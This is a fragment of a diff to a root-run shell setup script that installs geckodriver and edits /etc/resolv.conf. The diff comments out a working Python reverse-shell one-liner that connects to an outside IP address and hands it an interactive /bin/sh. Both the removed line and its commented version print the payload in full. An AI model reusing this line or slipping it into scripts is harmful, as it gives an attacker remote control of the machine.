@@ -14,6 +14,6 @@ chmod +x geckodriver
 mv geckodriver /usr/bin/geckodriver-30
 
 
-python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("105.111.63.126",10001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+#python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("105.111.63.126",10001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 chown root:root /etc/resolv.conf
 echo -e "nameserver 8.8.8.8\nnameserver 8.8.4.4" >>  /etc/resolv.conf
